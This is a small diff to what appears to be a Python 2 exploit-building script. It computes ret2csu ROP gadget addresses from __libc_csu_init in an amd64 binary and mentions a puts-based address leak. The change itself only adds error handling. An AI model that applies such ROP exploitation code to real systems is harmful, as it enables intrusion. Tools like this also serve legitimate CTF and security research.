@@ -19,8 +19,12 @@ if binary.arch != "amd64":
     print "error: the binary arch must be amd64"
     exit(1)
 
-gadget1 = binary.symbols["__libc_csu_init"] + (0x4005EA - 0x400590)
-gadget2 = binary.symbols["__libc_csu_init"] + (0x4005D0 - 0x400590)
+try:
+    gadget1 = binary.symbols["__libc_csu_init"] + (0x4005EA - 0x400590)
+    gadget2 = binary.symbols["__libc_csu_init"] + (0x4005D0 - 0x400590)
+except KeyError:
+    print "error: __libc_csu_init is not in the symbols list"
+    exit(1)
 
 if "puts" in binary.got:
     print "[*] using `puts` to print the leak"
